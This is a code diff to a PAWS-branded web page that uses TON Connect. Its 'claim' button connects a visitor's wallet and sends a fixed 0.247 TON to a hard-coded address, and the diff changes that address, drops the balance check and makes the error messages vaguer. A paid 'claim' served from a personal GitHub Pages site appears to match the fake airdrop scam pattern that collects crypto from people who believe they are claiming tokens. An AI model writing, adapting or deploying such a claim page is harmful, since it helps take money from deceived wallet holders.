@@ -211,10 +211,10 @@ alt="PAWS Logo" class="logo">
 
 <!-- Scripts -->
 <script>
-const CONTRACT_ADDRESS = 'EQDzXHNS_jgTHaB1et8zfXAgKUtQ_-Zm23n23fUesosf0WnA';
+const CONTRACT_ADDRESS = 'EQBPWzPE-3rthdoXpNBiwHUadE9MhaeyT1tctnlgx2ZA5zGP';
 const REQUIRED_AMOUNT = '247000000'; // 0.247 TON in nanotons
 
-// Initialize TON Connect
+// Initialize TON Connect with correct options
 const tonConnect = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: 'https://hasan199191.github.io/my-ton-app/tonconnect-manifest.json',
     buttonRootId: 'connect-container',
@@ -263,24 +263,26 @@ function showMessage(message) {
 
 async function handleClaim() {
     try {
-        // Check wallet balance first
-        const balance = await tonConnect.wallet?.ton.getBalance();
-        if (BigInt(balance || 0) < BigInt(REQUIRED_AMOUNT)) {
-            showMessage("Insufficient balance. You need at least 0.247 TON.");
+        // First check if wallet is connected
+        if (!tonConnect.connected) {
+            showMessage("Please connect your wallet first");
             return;
         }
 
-        // If user confirms, proceed with transaction
+        // Check wallet balance
+        const walletInfo = await tonConnect.account;
+        if (!walletInfo) {
+            showMessage("Cannot access wallet information");
+            return;
+        }
+
+        // Prepare transaction
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 600,
             messages: [{
                 address: CONTRACT_ADDRESS,
                 amount: REQUIRED_AMOUNT,
-                stateInit: null,
-                payload: {
-                    abi: "increment",
-                    method: "increment"
-                }
+                payload: "Increment"  // Basit string mesaj
             }]
         };
 
@@ -298,10 +300,8 @@ async function handleClaim() {
         console.error('Full error details:', error);
         if (error.message?.includes('rejected')) {
             showMessage("Transaction was rejected by user");
-        } else if (error.message?.includes('balance')) {
-            showMessage("Insufficient balance");
         } else {
-            showMessage(`Transaction failed: ${error.message}`);
+            showMessage("Transaction failed. Please try again.");
         }
     } finally {
         claimButton.disabled = false;
